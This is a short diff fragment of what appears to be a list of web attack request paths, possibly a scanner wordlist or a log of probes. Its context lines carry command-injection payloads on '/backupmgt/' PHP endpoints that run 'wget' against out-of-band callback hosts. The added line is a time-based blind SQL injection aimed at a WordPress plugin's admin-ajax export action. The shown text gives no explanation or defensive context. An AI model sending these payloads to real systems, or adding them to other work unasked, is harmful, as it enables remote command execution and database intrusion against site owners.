@@ -8127,3 +8127,4 @@ a
 /backupmgt/pre_connect_check.php?auth_name=fail;wget+http://ctu1e2la6l84rsl142k0boj9g4uy654oq.oast.live;
 /backupmgt/localJob.php?session=fail;wget+http://ctu1e2la6l84rsl142k0r4rpy8mqjznum.oast.live;
 /webadmin/auth/verification.php
+/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json
